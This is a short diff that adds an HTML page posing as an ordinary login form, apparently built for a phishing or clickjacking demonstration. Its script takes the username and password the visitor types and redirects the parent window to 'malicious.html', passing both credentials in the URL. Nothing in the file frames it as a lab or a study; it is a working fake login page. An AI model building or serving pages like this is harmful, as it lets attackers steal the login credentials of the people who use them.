@@ -1,0 +1,18 @@
+<html>
+    <head>
+        <title>Login</title>
+        <script>
+            function jmpWithParams() {
+                var username = document.getElementById("usr").value;
+                var password = document.getElementById("pwd").value;
+                parent.location.href = "malicious.html?username=" + username + "&password=" + password;
+            }
+        </script>
+    </head>
+    <body>
+        <p>Please login</p>
+        <div><input id="usr" type="text" name="username" placeholder="Please input username"></div>
+        <div><input id="pwd" type="password" name="password" placeholder="Please input password"></div>
+        <div><input type="button" value="login" onclick="jmpWithParams()"></div>
+    </body>
+</html>
